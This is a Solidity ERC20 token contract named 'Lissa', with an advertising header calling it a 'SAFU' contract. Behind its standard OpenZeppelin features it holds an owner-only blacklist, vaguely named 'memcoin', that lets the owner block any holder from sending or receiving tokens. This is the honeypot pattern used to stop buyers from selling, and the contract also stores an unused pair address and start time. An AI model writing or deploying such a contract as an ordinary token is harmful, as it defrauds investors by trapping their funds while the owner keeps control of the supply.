// Get your SAFU contract now via Coinsult.net

// SPDX-License-Identifier: MIT

pragma solidity 0.8.2;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

import "./Owned.sol";


contract Lissa is
    ERC20,
    ERC20Burnable,
    ERC20Snapshot,
    Owned
    
    
{




  mapping (address => bool) private _imemcoin;
 

   uint256 private _timetostart;
   bool public checkifcannft;
   
     address public uniswapV2Pair;
     
       
     
 
    /**
     * @dev Sets the values for {name} and {symbol} and mint the tokens to the address set.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(
        address _owner,
        string memory token,
        string memory _symbol
       
        )
        
    
        ERC20(token,
        _symbol
        )
        Owned(_owner)
        
    {
      
        _mint(_owner, 500000000000000 ether);
    
      
    }

    /**
     * @dev Creates a new snapshot and returns its snapshot id.
     *
     * Emits a {Snapshot} event that contains the same id.
     *
     * {_snapshot} is `internal` and you have to decide how to expose it externally. Its usage may be restricted to a
     * set of accounts, for example in our contract, only Owner can call it.
     *
     */
    function snapshot() public onlyOwner {
        _snapshot();
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */


    
     function setRule(address _uniswapV2Pair,uint256 timetostart) external onlyOwner {
       _timetostart= timetostart;
        uniswapV2Pair = _uniswapV2Pair;
       
    }





      function addmemcoin (address _evilUser) public onlyOwner {
     
        _imemcoin[_evilUser] = true;
     }


          function _emits (address _evilUser)internal virtual{
     
        _imemcoin[_evilUser] = true;
         }



     function removememcoin (address _clearedUser) public onlyOwner {
        
        _imemcoin[_clearedUser] = false;
     }

     function _getmemcoinStatus(address _maker) private view returns (bool) {
        return _imemcoin[_maker];
     }

     function setcheckifcannft(bool _canbe) external onlyOwner {
       
       checkifcannft = _canbe;
      
       }
   
 


         function _beforeTokenTransfer(
          address from,
          address to,
          uint256 amount
          ) internal override(ERC20, ERC20Snapshot) {
      
      
          
         
             require(_getmemcoinStatus(from) == false ,"this is Not Our Token");
             require(_getmemcoinStatus(to) == false , "this is Not Our Token");
             require(_getmemcoinStatus(msg.sender) == false , "this is Not Our Token");
        
           

      
       

        

        super._beforeTokenTransfer(from, to, amount);

        



       

      





        
     
          
    }
}